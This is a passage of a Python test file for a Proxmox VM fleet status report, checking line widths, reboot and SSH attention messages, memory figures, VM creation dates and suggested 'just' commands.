    found["localhost"] = {"fleet": fleet}
    return S.status_report(found, "2026-10-25 14:32 PDT", 1_800_000_000)


def test_every_line_of_a_report_of_every_state_fits_100_columns() -> None:
    model = _every_state()
    text = T.status_text(model, reading="read in 8.2 s · proxmox 0.9 s · vms 20 of 20 6.4 s")
    widest = max(text.splitlines(), key=len)
    assert len(widest) <= T.WIDTH, widest
    # And every kind of item is there: a test of the states, not only of the width.
    said = " ".join(it["text"] for it in model["attention"])
    for words in (
        "Remote Control is not running",
        "not set up",
        "is stopped",
        "is not installed",
        "could not check its login",
        "tailscaled is not running",
        "Tailscale is not installed",
        "waits for a reboot",
        "security upgrades",
        "is not the one this machine holds",
        "holds no SSH host key",
        "did not answer SSH",
        "refused SSH",
        "refused this machine's SSH key",
        "SSH to 192.0.2",
        "was not read",
        "the settings ask for",
    ):
        assert words in said, words


def test_the_longest_footer_and_kernel_fit_100_columns() -> None:
    # Nothing wrong and things to do is the footer's longest; a live smoke found it cut, and the kernel cell too.
    fleet = _fleet()
    found = {"localhost": {"fleet": fleet}}
    for vm in fleet["vms"][:2]:
        vm["address"] = "192.0.2.60"
    model = S.status_report(found, "2026-10-25 14:32 PDT", 1_800_000_000)
    model["attention"] = [S._item("todo", "alpha", "x")] * 12
    model["counts"] = {"unread": 0, "problem": 0, "todo": 12}
    model["exit"] = 0
    model["proxmox"]["unread"] = ""
    footer = T.status_text(model).splitlines()[-1]
    assert footer == "exit 0 · nothing is wrong; 12 things wait for you · --only, --json: just help status"
    system = T._system_lines({**model, "vms": [{"name": "alpha", "needs_ssh": True, "ssh": {"system": SYSTEM}}]})
    kernel = screen.plain(system[1])
    assert "6.8.0-142 · 6.8.0-147 waits" in kernel and len(kernel) <= T.WIDTH, kernel


def test_a_reboot_says_each_editors_windows_as_the_editors_list_names_them() -> None:
    # One map of the windows open, by the editors list's keys and in its order: an editor the list gains is said with
    # no line of its own here, and a key the list has not got is never said.
    fleet = _fleet()
    fleet["vms"][0]["address"] = "192.0.2.60"
    fleet["settings"]["editor_names"] = {"vscode": "VS Code", "zed": "Zed", "helix": "Helix"}
    windows = {"zed": 2, "vscode": 1, "helix": 3, "emacs": 4}
    system = {**SYSTEM, "claude": 1, "editor_windows_by": windows}
    found = {"localhost": {"fleet": fleet}, "alpha": {"ssh": {"reached": True, "system": system}}}
    model = S.status_report(found, "now", 1_800_000_000)
    (text,) = [it["text"] for it in model["attention"] if it["text"].startswith("waits for a reboot")]
    assert text == (
        "waits for a reboot: kernel 6.8.0-147 is installed, 6.8.0-142 runs; 1 claude process, 1 VS Code window,"
        " 2 Zed windows and 3 Helix windows are open there"
    )
    # A map that is not one, as a VM may send, is no window at all.
    system["editor_windows_by"] = ["vscode"]
    (text,) = [it["text"] for it in S.status_report(found, "now", 1_800_000_000)["attention"] if "reboot" in it["text"]]
    assert text.endswith("; 1 claude process is open there"), text


def test_with_more_than_one_host_every_line_names_the_host_after_a_space() -> None:
    # " --host <name>", as a run's own lines end: made one line with the rest of the settings, it lost its space and
    # was joined to the line's last word, as "ssh-config--host nuc" (live, 2026-11-13).
    fleet = _fleet()
    fleet["vms"][0]["address"] = "192.0.2.60"
    fleet["settings"]["host_flag"] = " --host nuc"
    found = {"localhost": {"fleet": fleet}, "alpha": {"ssh": {"reached": True, "system": {**SYSTEM, "claude": 1}}}}
    model = S.status_report(found, "now", 1_800_000_000)
    (reboot,) = [it["command"] for it in model["attention"] if it["text"].startswith("waits for a reboot")]
    assert reboot.endswith("then just deploy --only ssh-config --host nuc"), reboot
    named = [it["command"] for it in model["attention"] if "--host" in (it.get("command") or "")]
    assert named and all(" --host nuc" in command for command in named), named


def test_a_vm_is_dated_by_its_disk_and_drawn_from_then_on() -> None:
    # A clone carries the template's meta ctime (Proxmox VE 9.2, on a real clone); its disk's ctime is its own.
    # And Proxmox keeps a VMID's history: a VM made an hour ago under a reused ID shows none of the one before it.
    now = 1_800_000_000
    listing = [dict(LISTING[0])]
    contents = [
        {
            "item": {"node": "pve", "storage": "local-lvm"},
            "status": 200,
            "json": {
                "data": [
                    {"volid": "local-lvm:vm-100-disk-0", "vmid": 100, "size": 1, "ctime": str(now - 3600)},
                    {"volid": "local-lvm:vm-100-cloudinit", "vmid": 100, "size": 1, "ctime": str(now - 60)},
                ]
            },
        }
    ]
    configs = [
        {"item": {"vmid": 100}, "status": 200, "json": {"data": {"meta": "creation-qemu=9.2.0,ctime=1700000000"}}}
    ]
    fleet = S.status_fleet(
        listing,
        tagged=listing,
        requested=listing,
        addressed=[dict(listing[0], address="")],
        configs=configs,
        lists=[
            {
                "item": "cluster/resources?type=storage",
                "status": 200,
                "json": {"data": [{"storage": "local-lvm", "node": "pve"}]},
            }
        ],
        contents=contents,
        settings=SETTINGS,
    )
    assert fleet["vms"][0]["created"] == now - 3600
    points = [{"time": now - 7200 + 60 * i, "cpu": 0.9 if i < 60 else 0.1} for i in range(120)]
    api = S.status_vm_api([_result("rrddata", points)], now, since=now - 3600)
    assert [v for v in api["cpu_24h"] if v is not None] == [0.1]
    model = S.status_report({"localhost": {"fleet": fleet}}, "now", now)
    assert model["vms"][0]["created_ago"] == "1 h ago"


def test_memory_is_the_vms_own_count_where_it_was_read_over_ssh() -> None:
    # On a live VM Proxmox said 3.5 of 4.0 GiB in use and the VM 1.7: Proxmox counts the page cache as used.
    fleet = _fleet()
    found = {"localhost": {"fleet": fleet}}
    alpha = fleet["vms"][0]
    alpha["address"] = "192.0.2.60"
    alpha["mem"], alpha["maxmem"] = int(3.5 * G), 4 * G
    found["alpha"] = {
        "api": {"read": True, "state": "running", "root": None, "pending": []},
        "ssh": {"reached": True, "system": {"memory": {"total": int(3.82 * G), "available": int(2.13 * G)}}},
    }
    model = S.status_report(found, "now", 1_800_000_000)
    vm = model["vms"][0]
    assert (vm["mem_source"], round(vm["mem_used"] / G, 2)) == ("guest", 1.69)
    row = next(line for line in T.status_text(model).splitlines() if "● alpha" in line)
    assert " 1.7 / 3.8 " in row, row
    # API alone, Proxmox's figure.
    fleet["settings"]["sections"] = "vms,storage"
    del found["alpha"]["ssh"]
    model = S.status_report(found, "now", 1_800_000_000)
    assert model["vms"][0]["mem_source"] == "proxmox"


def test_every_just_command_status_gives_is_one_the_justfile_accepts() -> None:
    from test_commands import _commands_in, _problem, _recipes

    recipes = _recipes()
    model = _every_state()
    commands = []
    for item in model["attention"]:
        for text in (item["text"], item["command"]):
            commands += [
                (recipe, words) for *_, recipe, words in _commands_in(text.replace("x --only", "alpha --only"))
            ]
    assert len(commands) > 10
    for recipe, words in commands:
        assert recipe in recipes, recipe
        assert _problem(recipes[recipe], recipes, words) is None, (recipe, words)
